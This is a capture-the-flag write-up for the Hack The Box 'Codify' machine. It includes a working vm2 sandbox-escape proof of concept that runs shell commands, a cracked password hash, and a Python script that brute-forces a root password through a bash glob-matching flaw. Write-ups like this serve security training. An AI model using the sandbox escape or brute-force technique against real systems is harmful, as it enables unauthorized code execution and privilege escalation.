---
layout: post
title: Hack The Box - Codify
date: 2023-12-16 17:40 +0100
image:
    path: /assets/img/posts/codify/codify-card.png
    alt: Codify card
categories: [HackTheBox]
tags: [Hack-The-Box-Easy, pattern-matching]
---

The Codify box, features a web application vulnerable to a sandbox escape in the vm2 library. An Nmap scan revealed open ports for HTTP, and a Node.js Express application. The exploitation process involved cracking a user's hashed password and leveraging sudo permissions on a script to escalate privileges.

```
HOST: 10.10.11.239
```

## Enumeration

### Nmap scan

```bash
┌──(rether㉿rether)
└─$ nmap -A 10.10.11.239
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 17:44 CET
Nmap scan report for 10.10.11.239
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to https://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache web server is running on port 80, with a redirect to a domain (codify.htb).
And, an application developed with Node.js Express framework is accessible on port 3000, possibly a web application named "Codify."

### HTTP - Port 80

!["Codify home page"](/assets/img/posts/codify/codify-home.png "Codify home page")

Codify is a web application designed for easy testing of Node.js code. It allows us to write and run code snippets directly in the browser without any setup or installation.

!["Codify editor page"](/assets/img/posts/codify/codify-editor.png "Codify editor page")

!["Codify about us page"](/assets/img/posts/codify/codify-about-us.png "Codify about us page")

Looking at the [about-us](https://codify.htb/about) page, we can see that the [vm2](https://github.com/patriksimek/vm2) library is used for the editor

Reading the README file in the github repository, we see that librarie has been deprecated.

And searching the web, we found this (sandbox escape) [https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244]

### Sandbox escape - vm2

To check whether the version of vm2 on this web server is vulnerable, we use this POC:

```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ls -al');
}
`;

console.log(vm.run(code));
```

And we got this:

!["Codify editor poc result"](/assets/img/posts/codify/codify-editor-poc-result.png "Codify editor poc result")

This means that the POC works.

## Get user flag

Digging around in the web folder (`/var/www`), we found a database file `tickets.db` (`/var/www/contact/tickets.db`).

Reading through it, we found this user credential

```bash
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

This `joshua` has been referenced in the `/etc/passwd` file:

```bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
```

### John (crack password)

Add this hashed password to a file and use john ripper to crack it.

```bash
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' >> hash
```

```bash
┌──(rether㉿rether)
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)
1g 0:00:00:57 DONE (2023-12-16 18:29) 0.01734g/s 23.72p/s 23.72c/s 23.72C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Using these credentials, we can try to establish an ssh connection. And get the user flag

```bash
┌──(rether㉿rether)
└─$ ssh joshua@codify.htb
[...]
joshua@codify:~$ whoami
joshua
joshua@codify:~$ cat user.txt
[user-flag]
```

## Enumeration (for root flag)

Check user authorization:

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

The user `joshua` can run this script as sudo:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

This script uses the root login to perform the database backup.

This part of the bash script is vulnerable of `Pattern Matching`:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```

### Example of Pattern Matching Vulnerability:

-   Suppose the actual password is `secret123`.
-   The brute-force script starts with `s*`, which matches `secret123` because `s` is correct and `*` matches ecret123.
-   The script then tries `se*`, which also matches, and so on.
-   This way, the script only needs to correctly guess the password up to a certain point, after which the wildcard `*` takes care of the rest.

To find the root password we can make a python script:

```py
#!/usr/bin/env python3
import string
import subprocess

characters = list(string.ascii_letters + string.digits)
password = ""

while True:
    for character in characters:
        output = subprocess.run(f"/bin/echo {password}{character}* | sudo /opt/scripts/mysql-backup.sh", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(f"\r{password}", end="")
            break
    else:
        print()
        break
```

By running this script, we found the root password:

```bash
joshua@codify:~$ python3 exploit.py
kljh12k3jhaskjh12kjh3
```

And we can get the root flag:

```bash
joshua@codify:~$ su root
Password:
root@codify:/home/joshua# cat /root/root.txt
[root-flag]
```

!["Codify pwned card"](/assets/img/posts/codify/codify-pwned-card.png "Codify pwned card")
